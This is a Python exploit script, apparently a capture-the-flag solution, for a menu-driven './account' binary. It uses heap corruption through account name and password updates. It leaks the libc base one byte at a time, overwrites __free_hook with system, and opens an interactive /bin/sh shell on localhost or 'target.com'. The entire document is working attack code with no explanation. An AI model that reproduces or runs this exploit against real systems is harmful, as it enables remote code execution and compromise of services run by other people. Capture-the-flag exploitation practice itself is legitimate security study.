#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './account'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'target.com', 'port':4296})
env.set_item('libc',    local   = None, \
                        remote  = 'libc-2.27.so')
env.select('local')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    ac = Account(conn)

    addr_libc_mainarena = libc.address + offset_libc_mainarena
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    for i in range(0, 9):
        ac.create(0x100, str(i)*0xf0, 'pass\n')

    ac.login('7'*0xf0, 'pass')
    ac.update_password('*'*0x10+p64(0x130*8).rstrip('\x00'))
    ac.delete()

    for i in range(6, 0, -1):  # 6-1
        ac.login(str(i)*0xf0, 'pass')
        ac.delete()

    ac.create(0x30, 'a'*0x20, 'pass\n')

    ac.login('0'*0xf0, 'pass')
    ac.delete()
    ac.login('8'*0xf0, 'pass')
    ac.delete()

    ac.create(0x110, 'A'*0xf8+p64(0x31), 'pass\n')

    ac.create(0x20, 'b'*0x10, 'pass\n')
    ac.login('b'*0x10, 'pass\n')
    ac.delete()

    ac.create(0x30, 'c'*0x20, 'pass\n')
    ac.login('c'*0x20, 'pass\n')
    ac.update_name(0x20, 'c'*0x10+p64(addr_libc_free_hook))
    ac.logout()

    ac.create(0x20, '/bin/sh', 'pass\n')
    ac.create(0x20, p64(addr_libc_system), 'pass\n')

    ac.login('/bin/sh', 'pass')
    ac.delete()

def detect_libc():
    log_level = context.log_level
    context.log_level = 'info'

    conn = communicate(env.mode, **env.target)
    ac = Account(conn)

    for i in range(0, 9):
        ac.create(0x100, str(i)*0xf0, 'pass\n')

    ac.login('7'*0xf0, 'pass')
    ac.update_password('*'*0x10+p64(0x130*8).rstrip('\x00'))
    ac.delete()

    for i in range(6, 0, -1):  # 6-1
        ac.login(str(i)*0xf0, 'pass')
        ac.delete()

    ac.create(0x30, 'a'*0x20, 'pass\n')

    ac.login('0'*0xf0, 'pass')
    ac.delete()
    ac.login('8'*0xf0, 'pass')
    ac.delete()

    ac.create(0x120, 'A'*0x110, '\n')
    ac.create(0xf0,  'B'*0xe0, 'p'*0x8+p64(0x131)+'P'*7)

    ac.login('P'*0x7, 'pass')
    ac.update_name(0x18, 'P'*0x7+'\x00'+p64(0x151))
    ac.logout()

    addr = p64(offset_libc_mainarena+0x60)[0]
    while len(addr) < 5:
        offset = len(addr)

        ac.create(0x120, 'X'*0x110, 'pass\n')

        ac.login('P'*0x7, 'pass')
        ac.update_name(0x118, 'P'*0x7+'\x00'+p64(0x101)+'Y'*0xf8+p64(0x21))
        ac.logout()

        ac.login('Y'*0xf8+p64(0x21), 'pass\n')
        ac.delete()

        ac.login('P'*0x7, 'pass')
        ac.update_name(0x11+offset, 'Z'*(0x10+offset))
        ac.logout()

        for c in range(0, 0x100):
            conn.sendlineafter('Exit\n>> ', '2')
            conn.sendafter('name : ', 'Z'*(0x10+offset)+chr(c))
            if 'password : ' in conn.recv():
                info("leaked libc : 0x%x" % c)
                addr += chr(c)
                break

        conn.sendline('pass')
        ac.update_name(0x18, 'P'*0x7+'\x00'+p64(0x121))
        ac.logout()

    conn.close()

    addr += '\x7f'
    libc.address = u(addr)-0x60 - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))


    context.log_level = log_level 
    
class Account:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def create(self, length, name, password):
        self.sendlineafter('Exit\n>> ', '1')
        self.sendlineafter('length : ', str(length))
        self.sendafter('name : ', name)
        self.sendafter('password : ', password)

    def login(self, name, password):
        self.sendlineafter('Exit\n>> ', '2')
        self.sendafter('name : ', name)
        self.sendafter('password : ', password)

    def update_name(self, length, name):
        self.sendlineafter('Logout\n>> ', '1')
        self.sendlineafter('length : ', str(length))
        self.sendafter('name : ', name)

    def update_password(self, password):
        self.sendlineafter('Logout\n>> ', '2')
        self.sendafter('password : ', password)

    def delete(self):
        self.sendlineafter('Logout\n>> ', '5')

    def logout(self):
        self.sendlineafter('Logout\n>> ', '0')

#==========

if __name__=='__main__':
    detect_libc()
    #libc.address =  0x00007f1f12f21000

    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
